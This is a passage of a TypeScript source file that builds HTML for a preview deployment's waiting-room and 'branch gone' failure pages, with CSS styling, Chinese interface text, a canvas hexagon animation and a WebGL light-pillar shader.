.svc::after{content:"";position:absolute;left:-35%;top:0;bottom:0;width:34%;background:linear-gradient(90deg,transparent,rgba(245,242,255,.14),transparent);transform:skewX(-18deg);animation:svc-glint 3.2s ease-in-out infinite}
.svc:nth-child(2)::after{animation-delay:.42s}
.svc-dot{width:8px;height:8px;flex:0 0 8px;border-radius:50%;color:transparent;background:var(--svc-color);box-shadow:0 0 14px var(--svc-color);animation:svc-pulse 1.55s ease-in-out infinite}
.svc:nth-child(2) .svc-dot{animation-delay:.22s}
.estimate{width:min(620px,100%);margin:-8px 0 28px;padding:15px 16px;border:1px solid rgba(245,242,255,.12);border-radius:18px;background:rgba(255,255,255,.035);backdrop-filter:blur(12px)}
.estimate-top{display:flex;align-items:center;justify-content:space-between;gap:14px;margin-bottom:10px;font-size:12px;color:rgba(245,242,255,.7)}
.estimate-top strong{font-family:"JetBrains Mono","SFMono-Regular",Menlo,monospace;font-size:15px;color:#f8fafc}
.estimate-track{height:5px;border-radius:999px;background:rgba(255,255,255,.1);overflow:hidden}
.estimate-bar{display:block;height:100%;width:${progressPercent}%;border-radius:inherit;background:linear-gradient(90deg,#ffffff,#9f5050);box-shadow:0 0 18px rgba(255,255,255,.22);transition:width .45s ease}
.estimate-meta{display:flex;flex-wrap:wrap;gap:10px;margin-top:10px;font-size:11px;color:rgba(245,242,255,.52)}
.cds-tip{width:min(620px,100%);margin:-8px 0 28px;color:rgba(245,242,255,.54);font-size:12px;line-height:1.65}
.cds-tip strong{color:rgba(245,242,255,.82);font-weight:700}
.hint{display:flex;align-items:center;gap:18px;font-size:12px;color:var(--muted)}
.hint strong{color:#f5f7fa;font-weight:600}
.note{display:inline-flex;align-items:center;gap:8px;letter-spacing:.12em;text-transform:uppercase;font-family:"JetBrains Mono","SFMono-Regular",Menlo,monospace;font-size:11px;color:rgba(255,255,255,.48)}
.note::before{content:"";width:7px;height:7px;border-radius:50%;background:var(--sync);box-shadow:0 0 16px rgba(34,197,94,.72);animation:svc-pulse 1.55s ease-in-out infinite}
.shape-grid-bg.is-static{background:repeating-linear-gradient(30deg,rgba(255,255,255,.075) 0 1px,transparent 1px 34px),#120f17;animation:fallback-pulse 3.45s ease-in-out infinite}
@keyframes pulse{0%,100%{transform:scale(.96);opacity:.74}50%{transform:scale(1.04);opacity:1}}
@keyframes svc-pulse{0%,100%{transform:scale(.78);opacity:.58;filter:saturate(.9)}50%{transform:scale(1.28);opacity:1;filter:saturate(1.4)}}
@keyframes svc-glint{0%,32%{transform:translateX(0) skewX(-18deg);opacity:0}48%{opacity:1}72%,100%{transform:translateX(420%) skewX(-18deg);opacity:0}}
@keyframes glint{0%,38%{transform:translateX(0) skewX(-18deg);opacity:0}54%{opacity:1}78%,100%{transform:translateX(420%) skewX(-18deg);opacity:0}}
@keyframes fallback-pulse{0%,100%{filter:saturate(.9) brightness(.8)}50%{filter:saturate(1.2) brightness(1.1)}}
@keyframes shiny-text{0%{background-position:120% 0}100%{background-position:-120% 0}}
@media (max-width:760px){.shell{padding:28px;display:flex;align-items:flex-end}.content{width:100%}h1{font-size:44px}.subtitle{font-size:14px}.hint{align-items:flex-start;flex-direction:column}}
@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important}}
</style></head><body>
<canvas class="shape-grid-bg" id="shape-grid" aria-hidden="true" data-speed="0.39" data-size="34" data-shape="hexagon"></canvas>
<main class="shell">
  <section class="content">
    <div class="eyebrow">CDS Waiting Room</div>
    <h1><span class="shiny-text">${heading}</span></h1>
    <p class="subtitle">${subheading}</p>
    <div class="meta">
      <span class="chip branch">${safeBranch}</span>
      <span class="chip">分支状态 · ${stageLabel(status)}</span>
    </div>
    <div class="services">${services}</div>
    <div class="estimate">
      <div class="estimate-top"><span>预计构建进度</span><strong>${progressPercent}%</strong></div>
      <div class="estimate-track"><span class="estimate-bar"></span></div>
      <div class="estimate-meta"><span>置信度 高</span><span>基于 2 个服务状态与构建日志估算</span></div>
    </div>
    <p class="cds-tip"><strong>CDS 小提示：</strong><span>构建完成后还会等待服务健康检查稳定，再切入真实页面。</span></p>
    <div class="hint">
      <span><strong>后台同步</strong> 每 2 秒检查一次服务状态，就绪后再进入真实页面。</span>
      <span class="note">CDS Live Sync</span>
    </div>
  </section>
</main>
<script>
(function(){
  var canvas=document.getElementById('shape-grid');
  if(!canvas)return;
  var reduced=window.matchMedia&&window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  var ctx=canvas.getContext('2d');
  if(!ctx){canvas.className='shape-grid-bg is-static';return;}
  var speed=0.39,size=34,offset={x:0,y:0};
  var hexHoriz=size*1.5,hexVert=size*Math.sqrt(3);
  function resize(){
    var d=Math.min(window.devicePixelRatio||1,2);
    canvas.width=Math.max(1,Math.floor(window.innerWidth*d));
    canvas.height=Math.max(1,Math.floor(window.innerHeight*d));
    canvas.style.width='100%';
    canvas.style.height='100%';
    ctx.setTransform(d,0,0,d,0,0);
  }
  function drawHex(cx,cy,r){
    ctx.beginPath();
    for(var i=0;i<6;i+=1){
      var angle=Math.PI/3*i;
      var x=cx+r*Math.cos(angle);
      var y=cy+r*Math.sin(angle);
      if(i===0)ctx.moveTo(x,y);else ctx.lineTo(x,y);
    }
    ctx.closePath();
  }
  function draw(){
    var width=canvas.offsetWidth,height=canvas.offsetHeight;
    ctx.clearRect(0,0,width,height);
    offset.x=(offset.x-(reduced?0:speed)+hexHoriz*2)%(hexHoriz*2);
    offset.y=(offset.y-(reduced?0:speed)+hexVert)%hexVert;
    var colShift=Math.floor(offset.x/hexHoriz);
    var offsetX=((offset.x%hexHoriz)+hexHoriz)%hexHoriz;
    var offsetY=((offset.y%hexVert)+hexVert)%hexVert;
    var cols=Math.ceil(width/hexHoriz)+3;
    var rows=Math.ceil(height/hexVert)+3;
    ctx.lineWidth=1;
    ctx.strokeStyle='rgba(255,255,255,0.09)';
    for(var col=-2;col<cols;col+=1){
      for(var row=-2;row<rows;row+=1){
        var cx=col*hexHoriz+offsetX;
        var cy=row*hexVert+((col+colShift)%2!==0?hexVert/2:0)+offsetY;
        drawHex(cx,cy,size);
        ctx.stroke();
      }
    }
    var gradient=ctx.createRadialGradient(width*0.54,height*0.46,0,width*0.54,height*0.46,Math.sqrt(width*width+height*height)/2);
    gradient.addColorStop(0,'rgba(255,255,255,0.02)');
    gradient.addColorStop(0.5,'rgba(18,15,23,0.14)');
    gradient.addColorStop(1,'rgba(18,15,23,0.72)');
    ctx.fillStyle=gradient;
    ctx.fillRect(0,0,width,height);
    requestAnimationFrame(draw);
  }
  resize();
  window.addEventListener('resize',resize);
  requestAnimationFrame(draw);
}());
</script>
</body></html>`;
}

function buildLoadingPreviewBranchGoneHtml(slug: string, theme: 'dark' | 'light'): string {
  const safeSlug = escapeLoadingPreviewHtml(slug);
  const isLight = theme === 'light';
  const bg = isLight ? '#f7f7f4' : '#050407';
  const text = isLight ? '#18181b' : '#f7f5ff';
  const muted = isLight ? 'rgba(24,24,27,.62)' : 'rgba(245,242,255,.62)';
  const panel = isLight ? 'rgba(255,255,255,.58)' : 'rgba(255,255,255,.035)';
  const line = isLight ? 'rgba(24,24,27,.12)' : 'rgba(255,255,255,.12)';
  const danger = isLight ? '#b91c1c' : '#fca5a5';

  return `<!DOCTYPE html>
<html lang="zh-CN"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>启动失败 · ${safeSlug}</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{color-scheme:${isLight ? 'light' : 'dark'};--bg:${bg};--text:${text};--muted:${muted};--panel:${panel};--line:${line};--danger:${danger}}
html,body{min-height:100%}
body{min-height:100vh;overflow:hidden;background:var(--bg);color:var(--text);font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif}
body::before{content:"";position:fixed;inset:0;background:radial-gradient(760px 560px at 58% 48%,rgba(82,39,255,${isLight ? '.12' : '.2'}),transparent 66%),linear-gradient(90deg,${isLight ? 'rgba(247,247,244,.9),rgba(247,247,244,.34),rgba(247,247,244,.82)' : 'rgba(5,4,7,.92),rgba(5,4,7,.22),rgba(5,4,7,.82)'});z-index:1;pointer-events:none}
body::after{content:"";position:fixed;inset:0;z-index:1;pointer-events:none;opacity:${isLight ? '.18' : '.28'};background-image:linear-gradient(var(--line) 1px,transparent 1px),linear-gradient(90deg,var(--line) 1px,transparent 1px);background-size:84px 84px;mask-image:radial-gradient(circle at 52% 48%,#000 0%,transparent 72%)}
.light-pillar{position:fixed;inset:0;z-index:0;width:100%;height:100%;display:block;mix-blend-mode:${isLight ? 'multiply' : 'screen'}}
.light-pillar.is-static{background:linear-gradient(100deg,transparent 18%,rgba(82,39,255,.38) 46%,rgba(255,159,252,.36) 54%,transparent 82%);filter:blur(18px)}
.shell{position:relative;z-index:2;min-height:100vh;display:grid;align-items:center;padding:clamp(34px,7vw,96px)}
.content{max-width:720px;text-shadow:0 20px 80px rgba(0,0,0,${isLight ? '.08' : '.72'})}
.eyebrow{display:inline-flex;align-items:center;gap:10px;margin-bottom:28px;color:var(--muted);font:600 11px/1 "JetBrains Mono","SFMono-Regular",monospace;letter-spacing:.28em;text-transform:uppercase}
.eyebrow::before{content:"";width:7px;height:7px;border-radius:50%;background:var(--danger);box-shadow:0 0 18px var(--danger);animation:pulse 1.7s ease-in-out infinite}
h1{font-size:clamp(42px,5.5vw,78px);line-height:.96;letter-spacing:-.055em;margin-bottom:22px}
.desc{max-width:600px;color:var(--muted);font-size:clamp(15px,1.35vw,20px);line-height:1.75;margin-bottom:28px}
.chip{display:inline-flex;max-width:min(720px,88vw);align-items:center;border:1px solid var(--line);border-radius:999px;background:var(--panel);backdrop-filter:blur(12px);padding:10px 15px;color:var(--danger);font:600 13px/1.5 "JetBrains Mono","SFMono-Regular",monospace;word-break:break-all}
.actions{display:flex;flex-wrap:wrap;gap:12px;margin-top:28px}
.btn{border:1px solid var(--line);border-radius:999px;background:var(--panel);color:var(--text);padding:10px 16px;text-decoration:none;font-size:13px;font-weight:700}
.hint{margin-top:28px;color:var(--muted);font-size:12px}
@keyframes pulse{0%,100%{transform:scale(.76);opacity:.62}50%{transform:scale(1.24);opacity:1}}
@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important}}
</style></head><body>
<canvas class="light-pillar" id="light-pillar" aria-hidden="true"></canvas>
<main class="shell">
  <section class="content">
    <div class="eyebrow">CDS Preview Failed</div>
    <h1>启动失败</h1>
    <p class="desc">该分支已被删除、未部署，或当前 CDS 实例没有找到可路由的运行环境。这是不可自动恢复状态，请返回控制台检查分支状态和最近停止原因。</p>
    <div class="chip">${safeSlug}</div>
    <div class="actions">
      <a class="btn" href="/project-list">返回 CDS 控制台</a>
      <a class="btn" href="/cds-settings#loading-pages">查看加载页预览</a>
    </div>
    <div class="hint">CDS 会优先保留可诊断信息，避免把访问者带到空白或浏览器原生错误页。</div>
  </section>
</main>
<script id="light-pillar-vertex" type="x-shader/x-vertex">
attribute vec2 aPosition;
varying vec2 vUv;
void main(){vUv=(aPosition+1.0)*0.5;gl_Position=vec4(aPosition,0.0,1.0);}
</script>
<script id="light-pillar-fragment" type="x-shader/x-fragment">
precision highp float;
uniform float uTime;
uniform vec2 uResolution;
uniform vec3 uTopColor;
uniform vec3 uBottomColor;
uniform float uIntensity;
uniform float uGlowAmount;
uniform float uPillarWidth;
uniform float uPillarHeight;
uniform float uNoiseIntensity;
uniform float uRotCos;
uniform float uRotSin;
uniform float uPillarRotCos;
uniform float uPillarRotSin;
uniform float uWaveSin;
uniform float uWaveCos;
varying vec2 vUv;
const float STEP_MULT=1.0;
const int MAX_ITER=80;
const int WAVE_ITER=4;
vec3 tanh3(vec3 x){
  vec3 e2x=exp(2.0*x);
  return (e2x-1.0)/(e2x+1.0);
}
void main(){
  vec2 uv=(vUv*2.0-1.0)*vec2(uResolution.x/uResolution.y,1.0);
  uv=vec2(uPillarRotCos*uv.x-uPillarRotSin*uv.y,uPillarRotSin*uv.x+uPillarRotCos*uv.y);
  vec3 ro=vec3(0.0,0.0,-10.0);
  vec3 rd=normalize(vec3(uv,1.0));
  vec3 col=vec3(0.0);
  float t=0.1;
  for(int i=0;i<MAX_ITER;i++){
    vec3 p=ro+rd*t;
    p.xz=vec2(uRotCos*p.x-uRotSin*p.z,uRotSin*p.x+uRotCos*p.z);
    vec3 q=p;
    q.y=p.y*uPillarHeight+uTime;
    float freq=1.0;
    float amp=1.0;
    for(int j=0;j<WAVE_ITER;j++){
      q.xz=vec2(uWaveCos*q.x-uWaveSin*q.z,uWaveSin*q.x+uWaveCos*q.z);
      q+=cos(q.zxy*freq-uTime*float(j)*2.0)*amp;
      freq*=2.0;
      amp*=0.5;
    }
    float d=length(cos(q.xz))-0.2;
    float bound=length(p.xz)-uPillarWidth;
    float k=4.0;
    float h=max(k-abs(d-bound),0.0);
    d=max(d,bound)+h*h*0.0625/k;
    d=abs(d)*0.15+0.01;
    float grad=clamp((15.0-p.y)/30.0,0.0,1.0);
    col+=mix(uBottomColor,uTopColor,grad)/d;
    t+=d*STEP_MULT;
    if(t>50.0)break;
  }
  float widthNorm=uPillarWidth/3.0;
  col=tanh3(col*uGlowAmount/widthNorm);
  col-=fract(sin(dot(gl_FragCoord.xy,vec2(12.9898,78.233)))*43758.5453)/15.0*uNoiseIntensity;
  gl_FragColor=vec4(col*uIntensity,1.0);
}
</script>
<script>
(function(){
  var canvas=document.getElementById('light-pillar');
  if(!canvas)return;
  var reduced=window.matchMedia&&window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  var gl=canvas.getContext('webgl',{alpha:true,antialias:false,depth:false,stencil:false});
  if(!gl){canvas.className='light-pillar is-static';return;}
  function source(id){var n=document.getElementById(id);return n?n.textContent:'';}
  function shader(type,src){var s=gl.createShader(type);gl.shaderSource(s,src);gl.compileShader(s);if(!gl.getShaderParameter(s,gl.COMPILE_STATUS)){throw new Error(gl.getShaderInfoLog(s)||'shader failed');}return s;}
  function hex(v){var r=String(v).replace('#','');var n=parseInt(r.length===3?r.replace(/(.)/g,'$1$1'):r,16);return [(n>>16&255)/255,(n>>8&255)/255,(n&255)/255];}
  var program;
  try{
    program=gl.createProgram();
    gl.attachShader(program,shader(gl.VERTEX_SHADER,source('light-pillar-vertex')));
    gl.attachShader(program,shader(gl.FRAGMENT_SHADER,source('light-pillar-fragment')));
    gl.linkProgram(program);
    if(!gl.getProgramParameter(program,gl.LINK_STATUS))throw new Error(gl.getProgramInfoLog(program)||'link failed');
  }catch(e){canvas.className='light-pillar is-static';return;}
  gl.useProgram(program);
  var buffer=gl.createBuffer();
  gl.bindBuffer(gl.ARRAY_BUFFER,buffer);
  gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]),gl.STATIC_DRAW);
  var pos=gl.getAttribLocation(program,'aPosition');
  gl.enableVertexAttribArray(pos);
  gl.vertexAttribPointer(pos,2,gl.FLOAT,false,0,0);
  var loc={};
  ['uTime','uResolution','uTopColor','uBottomColor','uIntensity','uGlowAmount','uPillarWidth','uPillarHeight','uNoiseIntensity','uRotCos','uRotSin','uPillarRotCos','uPillarRotSin','uWaveSin','uWaveCos'].forEach(function(name){loc[name]=gl.getUniformLocation(program,name);});
  var top=hex('#5227FF');
  var bottom=hex('#FF9FFC');
  var pillarRot=25*Math.PI/180;
  gl.uniform3f(loc.uTopColor,top[0],top[1],top[2]);
  gl.uniform3f(loc.uBottomColor,bottom[0],bottom[1],bottom[2]);
  gl.uniform1f(loc.uIntensity,1);
  gl.uniform1f(loc.uGlowAmount,.002);
  gl.uniform1f(loc.uPillarWidth,3);
  gl.uniform1f(loc.uPillarHeight,.4);
  gl.uniform1f(loc.uNoiseIntensity,.5);
  gl.uniform1f(loc.uPillarRotCos,Math.cos(pillarRot));
  gl.uniform1f(loc.uPillarRotSin,Math.sin(pillarRot));
  gl.uniform1f(loc.uWaveSin,Math.sin(.4));
  gl.uniform1f(loc.uWaveCos,Math.cos(.4));
  function resize(){
    var d=Math.min(window.devicePixelRatio||1,2);
    canvas.width=Math.max(1,Math.floor(window.innerWidth*d));
    canvas.height=Math.max(1,Math.floor(window.innerHeight*d));
    canvas.style.width='100%';
    canvas.style.height='100%';
    gl.viewport(0,0,canvas.width,canvas.height);
    gl.uniform2f(loc.uResolution,canvas.width,canvas.height);
  }
  function draw(t){
    var time=reduced?0:t*.001*.3;
    gl.clearColor(0,0,0,0);
    gl.clear(gl.COLOR_BUFFER_BIT);
    gl.uniform1f(loc.uTime,time);
    gl.uniform1f(loc.uRotCos,Math.cos(time*.3));
    gl.uniform1f(loc.uRotSin,Math.sin(time*.3));
    gl.drawArrays(gl.TRIANGLES,0,6);
    requestAnimationFrame(draw);
  }
  resize();
  window.addEventListener('resize',resize);
  requestAnimationFrame(draw);
}());
</script>
</body></html>`;
}
